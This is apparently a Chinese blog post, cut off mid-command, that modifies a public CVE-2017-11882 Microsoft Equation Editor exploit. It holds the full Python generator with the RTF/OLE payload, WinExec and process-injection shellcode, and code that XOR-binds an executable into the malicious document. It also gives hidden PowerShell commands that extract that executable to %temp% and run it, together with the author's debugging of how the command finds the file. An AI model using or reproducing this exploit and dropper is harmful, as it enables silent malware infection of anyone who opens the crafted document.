01050000020000000B0000004571756174696F6E2E33000000000000000000000E0000D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF0900060000000000000000000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFF04000000FEFFFFFF05000000FEFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500FFFFFFFFFFFFFFFF0200000002CE020000000000C00000000000004600000000000000000000000070F7DECF0064D30103000000C00300000000000001004F006C00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000A000201FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006F006D0070004F0062006A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004F0062006A0049006E0066006F0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201FFFFFFFF04000000FFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000FEFFFFFF02000000FEFFFFFFFEFFFFFF05000000060000000700000008000000090000000A0000000B0000000C0000000D0000000E000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100FEFF030A0000FFFFFFFF02CE020000000000C000000000000046170000004D6963726F736F6674204571756174696F6E20332E30000C0000004453204571756174696F6E000B0000004571756174696F6E2E3300F439B271000000000000000000000000000000000000000000000000000000000000000000000000000000000300010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">stuff605 = <span class="string">&#x27;4500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000B5020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">tail605 = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000105000000000000&#125;&#123;\result&#123;\pict&#123;\*\picprop&#125;\wmetafile8\picw380\pich260\picwgoal380\pichgoal260</span></span><br><span class="line"><span class="string">0100090000039e00000002001c0000000000050000000902000000000500000002010100000005</span></span><br><span class="line"><span class="string">0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002</span></span><br><span class="line"><span class="string">1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000</span></span><br><span class="line"><span class="string">0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000</span></span><br><span class="line"><span class="string">0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000</span></span><br><span class="line"><span class="string">002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100</span></span><br><span class="line"><span class="string">000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a</span></span><br><span class="line"><span class="string">0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300</span></span><br><span class="line"><span class="string">00000000</span></span><br><span class="line"><span class="string">&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">\par&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 0:  b8 44 eb 71 12          mov    eax,0x1271eb44</span></span><br><span class="line"><span class="comment"># 5:  ba 78 56 34 12          mov    edx,0x12345678</span></span><br><span class="line"><span class="comment"># a:  31 d0                   xor    eax,edx</span></span><br><span class="line"><span class="comment"># c:  8b 08                   mov    ecx,DWORD PTR [eax]</span></span><br><span class="line"><span class="comment"># e:  8b 09                   mov    ecx,DWORD PTR [ecx]</span></span><br><span class="line"><span class="comment"># 10: 8b 09                   mov    ecx,DWORD PTR [ecx]</span></span><br><span class="line"><span class="comment"># 12: 66 83 c1 3c             add    cx,0x3c</span></span><br><span class="line"><span class="comment"># 16: 31 db                   xor    ebx,ebx</span></span><br><span class="line"><span class="comment"># 18: 53                      push   ebx</span></span><br><span class="line"><span class="comment"># 19: 51                      push   ecx</span></span><br><span class="line"><span class="comment"># 1a: be 64 3e 72 12          mov    esi,0x12723e64</span></span><br><span class="line"><span class="comment"># 1f: 31 d6                   xor    esi,edx</span></span><br><span class="line"><span class="comment"># 21: ff 16                   call   DWORD PTR [esi] // call WinExec</span></span><br><span class="line"><span class="comment"># 23: 53                      push   ebx</span></span><br><span class="line"><span class="comment"># 24: 66 83 ee 4c             sub    si,0x4c</span></span><br><span class="line"><span class="comment"># 28: ff 10                   call   DWORD PTR [eax] // call ExitProcess</span></span><br><span class="line">stagecmd = <span class="string">&quot;\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pads with nop</span></span><br><span class="line">stagecmd = stagecmd.ljust(<span class="number">44</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0:  b8 44 eb 71 12          mov    eax,0x1271eb44</span></span><br><span class="line"><span class="comment"># 5:  ba 78 56 34 12          mov    edx,0x12345678</span></span><br><span class="line"><span class="comment"># a:  31 d0                   xor    eax,edx</span></span><br><span class="line"><span class="comment"># c:  8b 08                   mov    ecx,DWORD PTR [eax]</span></span><br><span class="line"><span class="comment"># e:  8b 09                   mov    ecx,DWORD PTR [ecx]</span></span><br><span class="line"><span class="comment"># 10: 8b 09                   mov    ecx,DWORD PTR [ecx]</span></span><br><span class="line"><span class="comment"># 12: 66 83 c1 3c             add    cx,0x3c</span></span><br><span class="line"><span class="comment"># 16: ff e1                   jmp    ecx</span></span><br><span class="line">stagesc = <span class="string">&quot;\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\xFF\xE1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pads with nop</span></span><br><span class="line">stagesc = stagesc.ljust(<span class="number">44</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is shellcode to inject into another EQNEDT32.EXE and execute it</span></span><br><span class="line"><span class="comment"># source at shellcode.c</span></span><br><span class="line">stageinject = <span class="string">&#x27;U\x8b\xec\x83\xe4\xf8\x81\xec\xc4\x03\x00\x00\xb9U\x95\xdbmSVW\xe8\xc8\x02\x00\x00\x8b\xf8\x85\xffu\x18\xb9u\xee@p\xe8\xb8\x02\x00\x00\x8b\xf8\x85\xffu\x083\xc0@\xe9\xa3\x02\x00\x00\xba\x9e3i\xb7\x8b\xcf\xe8\xfb\x02\x00\x00\x8b\xf0\x85\xf6t\xe6\xba*\x92\x12\xd8\xe8\xeb\x02\x00\x003\xdb\x89D$ \x85\xc0u\x03S\xff\xd6\xba\xc8\xe8&quot;o\x8b\xcf\xe8\xd2\x02\x00\x00\x89D$8\x85\xc0u\x03S\xff\xd6\xba\xc2\xcf\xa2\xeb\x8b\xcf\xe8\xbb\x02\x00\x00\x89D$D\x85\xc0u\x03S\xff\xd6\xba\xaa?z\xbe\x8b\xcf\xe8\xa4\x02\x00\x00\x89D$4\x85\xc0u\x03S\xff\xd6\xba\xf3\xf4\xf8\x97\x8b\xcf\xe8\x8d\x02\x00\x00\x89D$$\x85\xc0u\x03S\xff\xd6\xbaN\x96 ~\x8b\xcf\xe8v\x02\x00\x00\x89D$0\x85\xc0u\x03S\xff\xd6\xba\x19.\xb5\xae\x8b\xcf\xe8_\x02\x00\x00\x8b\xd8\x85\xdbu\x03P\xff\xd6\xbaZj\x0c\xbb\x8b\xcf\xe8J\x02\x00\x00\x89D$@\x85\xc0u\x03P\xff\xd6\xba\x8d\xbfw\x82\x8b\xcf\xe83\x02\x00\x00\x89D$&lt;\x85\xc0u\x03P\xff\xd6jDY\x8dD$X3\xd2\x88\x10@Iu\xfaj\x10Y\x8dD$H\x88\x10@Iu\xfa3\xc0\xc7D$XD\x00\x00\x00f\x89\x84$\x88\x00\x00\x00\x8dD$HP\x8dD$\\\xc7\x84$\x88\x00\x00\x00\x01\x00\x00\x00PRRj\x02RRR\x8dD$0\xc7D$0EQNEPR\xc7D$&lt;DT32\xc7D$@.EXE\x88T$D\xff\xd3\x85\xc0u\x04j\xff\xff\xd6j`Y\x8d\x84$\xa0\x00\x00\x00\xc6\x00\x00@Iu\xf9\x83\xbc$\xa0\x00\x00\x00\x03tA\x8b|$4\x8b\\$$h\x88\x13\x00\x00\x8d\x84$\xa4\x00\x00\x00P\xff\xd7\x85\xc0u\x03P\xff\xd6\x83\xbc$\xa0\x00\x00\x00\x03t\x19h\x02\x00\x01\x00\xfft$X\xfft$X\xff\xd3\x83\xbc$\xa0\x00\x00\x00\x03u\xc7\x8b\x9c$\xb0\x00\x00\x00\x8d\x84$\x00\x01\x00\x00\x8b\xbc$\xb4\x00\x00\x00\xb9\xcc\x02\x00\x00\xc6\x00\x00@Iu\xf9\x8d\x84$\x00\x01\x00\x00\xc7\x84$\x00\x01\x00\x00\x01\x00\x01\x00PW\xffT$L\x85\xc0u\x03P\xff\xd6\x8dD$,Pj@h\x00P\x00\x00h\x00\x10@\x00S\xffT$4\x85\xc0u\x03P\xff\xd6\x83d$,\x00\xe8k\x01\x00\x00\x83d$(\x00\x8dH\x01\x89L$ \x8bD$ \x8b\x00\x89D$(\x8dD$,\x83\xc1\x04P\xfft$,Qh\x00\x10@\x00S\xffT$L3\xdb\x85\xc0u\x03S\xff\xd6\x8d\x84$\x00\x01\x00\x00\xc7\x84$\xb8\x01\x00\x00\x00\x10@\x00PW\xffT$8\x85\xc0u\x03S\xff\xd6S\xffT$D\x85\xc0u\x03S\xff\xd6h\x02\x00\x01\x00\xfft$X\xfft$X\xffT$0\x85\xc0u\x03S\xff\xd6\xfft$P\xffT$@\x85\xc0u\x03S\xff\xd6S\xff\xd6_^[\x8b\xe5]\xc3U\x8b\xecQSVW\x8b\xd9d\xa10\x00\x00\x00\x8b@\x0c\x8bp\x0c\x8bV0\x8b\xc2\x89E\xfc\x85\xd2t%\x0f\xb7\x02\xb9\x05\x15\x00\x003\xff\xeb\rk\xc9!\x0f\xb7\xc0\x03\xc8G\x0f\xb7\x04zf\x85\xc0u\xee;\xcbt\x15\x8bE\xfc\x8b6\x8bV0;\xd0u\xce3\xc0_^[\x8b\xe5]\xc3\x8bF\x18\xeb\xf4U\x8b\xec\x83\xec\x10\x8bA&lt;\x89U\xfc\x8bD\x08x\x85\xc0tV\x8bT\x08\x1cS\x8b\\\x08$\x03\xd1V\x8bt\x08 \x03\xd9\x8bD\x08\x18\x03\xf1\x89U\xf03\xd2\x89u\xf4\x89E\xf8W\x85\xc0t)\x8b4\x96\xbf\x05\x15\x00\x00\x03\xf1\xeb\tk\xff!\x0f\xbe\xc0\x03\xf8F\x8a\x06\x84\xc0u\xf1;&#125;\xfct\x12\x8bu\xf4B;U\xf8r\xd73\xc0_^[\x8b\xe5]\xc3\x0f\xb7\x04S\x8bU\xf0\x8b\x04\x82\x03\xc1\xeb\xeb\xeb\x04\x8b\x04$\xc3\xe8\xf7\xff\xff\xff\xc3&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genrtf605</span>(<span class="params"><span class="built_in">type</span>, cmd</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;use genrtf605&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;\x1c\x00\x00\x00\x02\x00\xa8\xc3\x99\x02\x00\x00\x00\x00\x00\x00H\x90]\x00l\x9c[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>:</span><br><span class="line">        payload += stagecmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += stagesc</span><br><span class="line"></span><br><span class="line">    payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x00402114</span>)  <span class="comment"># ret</span></span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    left = <span class="number">0x100</span> - <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义cmd命令</span></span><br><span class="line">    cmd = <span class="string">&quot;&quot;&quot;cmd /k &quot;cd c:\\users\\a\desktop &amp; echo 111 &gt; 1.txt&quot; &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += cmd[:left]</span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head605 + payload.encode(<span class="string">&#x27;hex&#x27;</span>) + stuff605 + cmd[left:].ljust(<span class="number">437</span>, <span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>) + tail605</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genrtf17k</span>(<span class="params"><span class="built_in">type</span>, cmd</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;use genrtf17k&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;\x1c\x00\x00\x00\x02\x00\xa8\xc3kF\x00\x00\x00\x00\x00\x00\xa0_s\x00d\x0cq\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>:</span><br><span class="line">        payload += stagecmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += stagesc</span><br><span class="line"></span><br><span class="line">    payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x00402114</span>)  <span class="comment"># ret</span></span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># cmd = &quot;&quot;&quot;cmd /c powershell -WindowStyle hidden -Command &quot;$rtfpath = Get-ChildItem *.doc | where-object &#123;$_.length -eq 0x00037831&#125; | Select-Object -ExpandProperty Name; $file = gc $rtfpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;; $path = &#x27;%temp%\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;;sc $path ([byte[]]($file | select -Skip 008241)) -Encoding Byte; &amp;$path;&quot; &quot;&quot;&quot;</span></span><br><span class="line">    payload += cmd</span><br><span class="line"></span><br><span class="line">    payload = payload.ljust(<span class="number">18055</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head17k.lower() + payload.encode(<span class="string">&#x27;hex&#x27;</span>) + tail17k.lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genrtf</span>(<span class="params"><span class="built_in">type</span>, cmd</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmd) &gt; <span class="number">17967</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Command must be shorter than 17967 bytes!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Code must be shorter than 17967 bytes!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmd) &gt; <span class="number">605</span>:</span><br><span class="line">        <span class="keyword">return</span> genrtf17k(<span class="built_in">type</span>, cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> genrtf605(<span class="built_in">type</span>, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(prog=<span class="string">&#x27;CVE-2017-11882.py&#x27;</span>,</span><br><span class="line">                                     description=<span class="string">&quot;Exploit for CVE-2017-11882  @unamer(https://github.com/unamer/CVE-2017-11882)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;Command or shellcode file to run in target system\n(Must be shorter than 17967 bytes!!)&quot;</span>,</span><br><span class="line">                        required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--type&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Type (0:shellcode 1:command, default=1)&quot;</span>, default=<span class="number">1</span>, <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">                        choices=[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                        required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--inject&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Inject shellcode to new process&quot;</span>, default=<span class="literal">None</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&quot;--output&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Output exploit rtf&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.<span class="built_in">type</span>:</span><br><span class="line">        data = args.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(args.cmd, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">            data = f.read()</span><br><span class="line">            f.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> args.inject <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                data = stageinject + pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">len</span>(data)) + data</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Error in reading shellcode file!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置异或值</span></span><br><span class="line">    bXorEncryptValue = <span class="number">0x77</span></span><br><span class="line">    <span class="comment"># 打开需要捆绑的文件，需要进行修改</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./PEiD.exe&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> bind:</span><br><span class="line">        dat = bind.read()</span><br><span class="line">        bind.close()</span><br><span class="line">        dat = <span class="built_in">bytearray</span>(dat)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dat)):</span><br><span class="line">            dat[i] = dat[i] ^ bXorEncryptValue</span><br><span class="line">        dat = <span class="built_in">bytes</span>(dat)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(genrtf(args.<span class="built_in">type</span>, data))</span><br><span class="line">        f.write(dat)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Done.&#x27;</span></span><br></pre></td></tr></table></figure><p>这里是直接硬编码文件名，可以执行但是我期望实现的是在不知道文件所在路径和文件名的情况下查找到文件</p><p>对应修改<code>Poc</code>代码107行(605字节版本)或者127行(17k版本)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&quot;&quot;&quot;cmd /c powershell -WindowStyle hidden -Command &quot;$rtfpath=&#x27;c:\users\dell\desktop\11882.doc&#x27;; $file = gc $rtfpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;; $path = &#x27;%temp%\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;;sc $path ([byte[]]($file | select -Skip 008241)) -Encoding Byte; &amp;$path;&quot; &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>借鉴<code>lnk</code>捆绑<code>exe</code>中通过文件大小查找文件的方式，失败</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&quot;&quot;&quot;cmd /c powershell -WindowStyle hidden -Command &quot;$rtfpath = Get-ChildItem *.doc | where-object &#123;$_.length -eq 0x00037831&#125; | Select-Object -ExpandProperty Name; $file = gc $rtfpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;; $path = &#x27;%temp%\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;;sc $path ([byte[]]($file | select -Skip 008241)) -Encoding Byte; &amp;$path;&quot; &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>通过查看当前目录发现问题：执行路径不是自己期望的文件所在路径，而是默认路径<code>C:\Windows\System32</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-<span class="number">2017</span>-<span class="number">11882.</span>py -c <span class="string">&#x27;cmd /c &quot;cd &gt; C:\\Users\DELL\Desktop\1.txt&quot;&#x27;</span> -o demo.doc</span><br></pre></td></tr></table></figure><p>遍历文件夹</p><p><a href="https://www.delftstack.com/zh/howto/powershell/get-full-path-of-the-files-in-powershell/#%e5%9c%a8-powershell-%e4%b8%ad%e4%bd%bf%e7%94%a8-get-childitem-%e8%8e%b7%e5%8f%96%e6%96%87%e4%bb%b6%e7%9a%84%e5%ae%8c%e6%95%b4%e8%b7%af%e5%be%84">powershell获取文件完整路径</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c <span class="string">&quot;cd .. &amp; cd .. &amp; powershell -WindowStyle hidden -Command &quot;</span><span class="variable">$rtfpath</span> = <span class="built_in">Get-ChildItem</span> <span class="literal">-filter</span> *.doc <span class="literal">-recurse</span> | <span class="built_in">where-object</span> &#123;<span class="variable">$_</span>.length <span class="operator">-eq</span> <span class="number">0</span>x00037831&#125; | %&#123;<span class="variable">$_</span>.FullName&#125;;<span class="variable">$file</span> = <span class="built_in">gc</span> <span class="variable">$rtfpath</span> <span class="literal">-Encoding</span> Byte;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$file</span>.count; <span class="variable">$i</span>++) &#123; <span class="variable">$file</span>[<span class="variable">$i</span>] = <span class="variable">$file</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>x77 &#125;;<span class="variable">$path</span> = <span 